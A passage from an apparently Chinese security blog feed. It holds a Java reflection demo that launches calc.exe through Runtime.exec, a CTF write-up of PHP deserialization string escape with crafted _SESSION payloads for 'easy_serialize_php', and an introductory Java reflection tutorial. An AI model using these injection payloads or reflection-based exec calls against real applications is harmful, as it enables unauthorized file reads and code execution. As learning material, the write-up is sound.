clazz.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        method.invoke(m,<span class="hljs-string">&quot;clac.exe&quot;</span>);<span class="hljs-comment">//调用实例化对象并且传入参数</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里产生了报错。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271536031.png" alt="QQ截图20220227153541"></p><p>私类构造函数无法直接进行<code>newInstance()</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271537610.png" alt="QQ截图20220227153650"></p><h3 id="非暴力"><a href="#非暴力" class="headerlink" title="非暴力"></a>非暴力</h3><p><strong>这里Runtime类可以通过getRuntime方法返回一个对象。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        method.invoke(clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271556483.png" alt="QQ截图20220227155543"></p><h3 id="暴力"><a href="#暴力" class="headerlink" title="暴力"></a>暴力</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructors</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>        declaredConstructors.setAccessible(<span class="hljs-literal">true</span>);<br>        clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(declaredConstructors.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271611004.png" alt="QQ截图20220227161118"></p><p>重要的是开启<code>.setAccessible(true);</code></p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化之字符串逃逸（变短）</title>
    <link href="/2022/02/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%EF%BC%88%E5%8F%98%E7%9F%AD%EF%BC%89/"/>
    <url>/2022/02/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%EF%BC%88%E5%8F%98%E7%9F%AD%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化之字符逃逸（变短）"><a href="#PHP反序列化之字符逃逸（变短）" class="headerlink" title="PHP反序列化之字符逃逸（变短）"></a>PHP反序列化之字符逃逸（变短）</h1><p>今天做buuctf上得题时候，就来学习一下。搜寻资料此类题型有两种方法。</p><h2 id="替换修改后导致序列化字符串变长"><a href="#替换修改后导致序列化字符串变长" class="headerlink" title="替换修改后导致序列化字符串变长"></a>替换修改后导致序列化字符串变长</h2><p>目前还没有碰到。</p><h2 id="替换修改后导致序列化字符串边短"><a href="#替换修改后导致序列化字符串边短" class="headerlink" title="替换修改后导致序列化字符串边短"></a>替换修改后导致序列化字符串边短</h2><p>简单说一下。(如果不懂php反序列化就别往下看了)<br>首先我们要了解php反序列化后得字符串<strong>：PHP在反序列化时，底层代码时以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾（字符串除外），并且是根据长度判断内容的</strong></p><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;phpflag&#x27;</span> =&gt; <span class="hljs-string">&#x27;;s:5:&quot;xsw6a&quot;;s:2:&quot;zx&quot;;s:1:&quot;1&quot;;&#125;&#x27;</span>,<br>    <span class="hljs-string">&#x27;cuit&#x27;</span> =&gt; <span class="hljs-string">&#x27;stop water and stop power college&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456601.png" alt="QQ截图20220227142612"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpflag&quot;</span>;s:<span class="hljs-number">31</span>:<span class="hljs-string">&quot;;s:5:&quot;</span>xsw6a<span class="hljs-string">&quot;;s:2:&quot;</span>zx<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;&#125;&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;cuit&quot;</span>;s:<span class="hljs-number">33</span>:<span class="hljs-string">&quot;stop water and stop power college&quot;</span>;&#125;&quot;<br></code></pre></td></tr></table></figure><p>那么什么叫字符串逃逸呢？</p><p><strong>首先第一点，在后续的利用过程中只会利用这一段。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpflag&quot;</span>;s:<span class="hljs-number">31</span>:<span class="hljs-string">&quot;;s:5:&quot;</span>xsw6a<span class="hljs-string">&quot;;s:2:&quot;</span>zx<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>假如这里添加一层过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$filter_arr</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<span class="hljs-comment">//这变成了一个正则表达式了哦</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$img</span>);<span class="hljs-comment">//看一下img里面有没有filter的东西，有的话，换成空格</span><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;phpflag&#x27;</span> =&gt; <span class="hljs-string">&#x27;;s:5:&quot;xsw6a&quot;;s:2:&quot;zx&quot;;s:1:&quot;1&quot;;&#125;&#x27;</span>,<br>    <span class="hljs-string">&#x27;cuit&#x27;</span> =&gt; <span class="hljs-string">&#x27;stop water and stop power college&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">filter</span>((<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>))));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271432213.png" alt="QQ截图20220227143230"></p><p>清楚可见这里得<code>phpflag</code>被过滤替换为空。这里实际的对应值如下。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">s<span class="hljs-number"> 7 </span>;s:31: <span class="hljs-comment">#第一个</span><br>s<span class="hljs-number"> 5 </span>xsw6a  <span class="hljs-comment">#第二个</span><br>s<span class="hljs-number"> 2 </span>zx     <span class="hljs-comment">#第三个</span><br>s<span class="hljs-number"> 1 </span>1      <span class="hljs-comment">#第四个</span><br></code></pre></td></tr></table></figure><h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456805.png" alt="QQ截图20220227143810"></h3><p>读代码。<br>依次分析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤而已。</p><p><strong>补充</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456400.png" alt="QQ截图20220227144023"></p><p>如果键名包含数字好像这里绕不过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>销毁session。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br></code></pre></td></tr></table></figure><p>重新传入参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br></code></pre></td></tr></table></figure><p>这个函数简单理解来说，就是可以直接覆盖上面的session值。本地实验如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271445397.png" alt="QQ截图20220227144500"></p><p>记住这一点很关键。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就是利用到上面将的：<strong>PHP在反序列化时，底层代码时以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾（字符串除外），并且是根据长度判断内容的</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>这里进入phpinfo看看。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456509.png" alt="QQ截图20220227144911"></p><p>构造：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;aa&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456115.png"></p><p>&#x2F;d0g3_fllllllag（将其base64）注意要加上<code>/</code>,弄了我半天。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;aa&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mbGxsbGxsYWc=&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456746.png" alt="QQ截图20220227145447"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初理解反射</title>
    <link href="/2022/02/25/%E5%88%9D%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/"/>
    <url>/2022/02/25/%E5%88%9D%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h1 id="初理解反射"><a href="#初理解反射" class="headerlink" title="初理解反射"></a>初理解反射</h1><h2 id="理解反射"><a href="#理解反射" class="headerlink" title="理解反射"></a>理解反射</h2><p>Java中的反射机制是指<strong>在运行状态中</strong>，对于任意一个类都能够知道这个类所有的属性和方法；并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。</p><p>这里的可以在运行状态中获取修改值很棒。以后的cc链就要用到。</p><h2 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Class.forName(&quot;全类名&quot;) 该过程处于字节码阶段</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">cls1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;xsw6a.Person&quot;</span>);<br>System.out.println(cls1);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//类名.class属性 该过程处于内存阶段</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">cls2</span> <span class="hljs-operator">=</span> Person.class;<br>System.out.println(cls2);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//对象.getClass()方法 该过程处于运行阶段</span><br><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">cls3</span> <span class="hljs-operator">=</span> p.getClass();<br>System.out.println(cls3);<br></code></pre></td></tr></table></figure><h2 id="类对象中有什么？"><a href="#类对象中有什么？" class="headerlink" title="类对象中有什么？"></a>类对象中有什么？</h2><ul><li>成员变量（Field对象，Field[] fields）</li><li>构造方法   (Constructor对象，Constructor[] cons)</li><li>成员方法  (Method对象，Method[] methods)</li></ul><h2 id="三种阶段"><a href="#三种阶段" class="headerlink" title="三种阶段"></a>三种阶段</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252218849.png" alt="image-20200411205831842"></p><h3 id="source源代码阶段"><a href="#source源代码阶段" class="headerlink" title="source源代码阶段"></a>source源代码阶段</h3><p>此时刚刚编译为字节码，仍然保存在硬盘上。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">cls1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;xsw6a.Person&quot;</span>);<br>System.out.println(cls1);<br></code></pre></td></tr></table></figure><h3 id="Class类对象阶段"><a href="#Class类对象阶段" class="headerlink" title="Class类对象阶段"></a>Class类对象阶段</h3><p>类加载器把Person.class字节码加载进内存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">cls2</span> <span class="hljs-operator">=</span> Person.class;<br>System.out.println(cls2);<br></code></pre></td></tr></table></figure><h3 id="运行时阶段"><a href="#运行时阶段" class="headerlink" title="运行时阶段"></a>运行时阶段</h3><p>这个时候类对象已经实例化成为了一个对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">cls3</span> <span class="hljs-operator">=</span> p.getClass();<br>System.out.println(cls3);<br></code></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li>使用Class.forName()会自动初始化该Class对象，Class.forName() 方法 当类加载进了内存，只有<strong>静态初始块</strong>得到了执行。getDeclaredxxx 不能获取父类的方法。</li><li>使用类名.class来创建Class对象的引用时，不会自动初始化该Class对象</li><li>Class.forName() 属于动态加载类。将字节码文件加载进内存，参数需要类的全限定名</li></ul><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="Person类"><a href="#Person类" class="headerlink" title="Person类"></a>Person类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;吃饭&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;打篮球&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="反射获取"><a href="#反射获取" class="headerlink" title="反射获取"></a>反射获取</h3><h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><ul><li>Fields[] getFields()：只能获取所有public修饰的成员变量</li><li>Fields getField(String name)：获取特定成员变量</li><li>Fields[] getDeclaredFields()：获取所有的成员变量，【不考虑】修饰符，不考虑继承</li><li>Fields getDeclaredField(String name)：获取特定的成员变量，【不考虑】修饰符，不考虑继承</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoFields</span> 